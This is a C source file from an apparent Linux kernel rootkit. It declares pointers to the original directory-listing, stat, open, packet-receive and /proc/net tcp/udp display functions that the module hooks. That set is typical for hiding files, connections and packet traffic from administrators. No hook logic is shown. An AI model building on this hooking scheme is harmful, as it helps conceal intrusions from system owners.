#include "hook_functions.h"

bool (*real_filldir64)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) = NULL;
bool (*real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) = NULL;

asmlinkage long (*real_sys_stat)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_lstat)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_newstat)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_newlstat)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_newfstatat)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_statx)(struct pt_regs *regs) = NULL;

asmlinkage long (*real_sys_open)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_openat)(struct pt_regs *regs) = NULL;
asmlinkage long (*real_sys_openat2)(struct pt_regs *regs) = NULL;


// asmlinkage long (*real_sys_recvmsg)(struct pt_regs *regs) = NULL;
int (*real_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) = NULL;
int (*real_packet_rcv_spkt)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) = NULL;
int (*real_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) = NULL;
asmlinkage long (*real_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
asmlinkage long (*real_tcp6_seq_show)(struct seq_file *seq, void *v) = NULL;
asmlinkage long (*real_udp4_seq_show)(struct seq_file *seq, void *v) = NULL;
asmlinkage long (*real_udp6_seq_show)(struct seq_file *seq, void *v) = NULL;